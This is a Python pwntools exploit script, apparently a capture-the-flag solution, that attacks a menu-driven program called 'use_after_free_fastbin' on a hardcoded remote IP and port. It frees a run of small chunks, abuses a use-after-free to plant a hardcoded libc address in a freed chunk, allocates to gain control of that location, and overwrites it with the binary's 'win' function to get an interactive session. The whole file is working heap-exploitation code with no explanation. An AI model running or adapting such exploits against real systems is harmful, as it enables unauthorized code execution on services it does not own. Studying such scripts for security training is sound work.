from pwn import process, gdb, args, p64, ELF, remote
binary = './use_after_free_fastbin'

gs = """
break main
continue
"""

e = ELF(binary)
END_OF_MENU = "e.g, l\n"

def malloc(p, size):
    p.sendline(b"m %d" % size)
    p.recvuntil(END_OF_MENU)

def free(p, index):
    p.sendline(b"f %d" % index)
    p.recvuntil(END_OF_MENU)

def edit(p, index, content):
    p.sendline(b"e %d %b" % (index, content))
    p.recvuntil(END_OF_MENU)

def exit(p):
    p.sendline(b"0")

def launch_attack(p):
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    free(p, 0)
    free(p, 1)
    free(p, 2)
    free(p, 3)
    free(p, 4)
    free(p, 5)
    free(p, 6)
    free(p, 7)
    malloc_add = p64(0x7ffff7dd18d8)
    edit(p,7, malloc_add)
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    malloc(p,8) 
    edit(p, 16, p64(e.symbols.win))
    p.sendline(b"f")
    p.interactive()




def main():
    if args.GDB:
        p = gdb.debug(binary, gdbscript=gs)
    else:
        p = remote("107.21.135.41", 15555)
    p.recvuntil(END_OF_MENU)
    launch_attack(p)

if __name__ == "__main__":
    main()